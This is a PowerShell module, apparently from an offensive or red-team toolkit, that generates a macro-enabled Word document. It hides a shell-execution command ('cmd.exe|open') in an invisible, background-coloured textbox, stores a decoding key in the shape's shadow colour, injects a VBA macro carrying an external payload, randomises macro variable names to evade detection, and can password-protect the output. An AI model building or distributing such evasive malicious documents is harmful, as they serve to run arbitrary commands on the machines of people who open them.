Import-Module $PSScriptRoot\..\..\internals\utils.psm1

<#

This module creates a macro document that utilizes MsoShape objects to store
commands and later references them for code execution

#>

function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    # AddTextbox(Orientation, Left, Top, Width, Height)
    # https://docs.microsoft.com/en-us/office/vba/api/excel.shapes.addtextbox
    # msoTextOrientationHorizontal
    $shape = $wdDoc.Shapes.AddTextbox(1, 72, 72, 0, 0)
    $shape.Name = "Shell.Application"
    $shape.TextFrame.TextRange.Text = "cmd.exe|open"
    $shape.Height = 1
    $shape.Width = 1

    # https://docs.microsoft.com/en-us/office/vba/api/office.msotristate
    # msoFalse
    $shape.Visible = 0
    $shape.Shadow.Visible = 1

    # https://stackoverflow.com/questions/27761097/change-the-background-color-of-a-word-file-via-powershell
    # https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-powershell-1.0/ee176944(v=technet.10)?redirectedfrom=MSDN
    # RGB(1, 33, 7)
    $val1 = Get-Random -Minimum 1 -Maximum 255
    $val2 = Get-Random -Minimum 1 -Maximum 255
    $val3 = Get-Random -Minimum 1 -Maximum 255
    $shape.Shadow.ForeColor.RGB = [long]($val1 + ($val2 * 256) + ($val3 * 65536))

    $shape.AlternativeText = "ShellExecute"
    $shape.TextFrame.TextRange.Font.TextColor.RGB = $wdDoc.Background.Fill.BackColor

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $macro = BuildMacro -key1 $val1 -key2 $val2 -key3 $val3
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $key1,

        [Parameter(mandatory=$true)]
        [String]
        $key2,

        [Parameter(mandatory=$true)]
        [String]
        $key3
    )

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")
  
    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $key = "RGB($key1, $key2, $key3)"
    $macro = $macro -replace "aKEYa", $key
    $macro = $macro -replace "aPAYLOADa", $payload

    return $macro

}